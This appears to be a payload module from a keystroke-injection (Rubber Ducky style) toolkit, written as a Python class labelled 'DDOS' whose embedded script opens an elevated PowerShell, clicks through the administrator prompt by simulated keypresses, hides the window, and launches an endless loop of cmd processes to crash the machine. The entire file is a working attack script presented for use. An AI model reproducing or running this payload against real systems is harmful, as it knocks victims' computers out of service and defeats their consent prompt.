class info:
    author="n0nuser"
    description = "Generates infinite processes and collapses the system."
    function = "DDOS"
    parameters = [ ]
    content = """\
DELAY 3000
GUI r
DELAY 400
STRING powershell Start-Process powershell -verb runAs
ENTER
DELAY 750
LEFT
DELAY 750
ENTER
DELAY 750
STRING [console]::WindowWidth=100; [console]::WindowHeight=1; [console]::BufferWidth=[console]::WindowWidth=1
ENTER
DELAY 750

STRING for /l %a in (0,0,0) do start cmd /MIN /Q /D /T:FE /F:OFF /V:ON /K
ENTER
DELAY 200\
"""
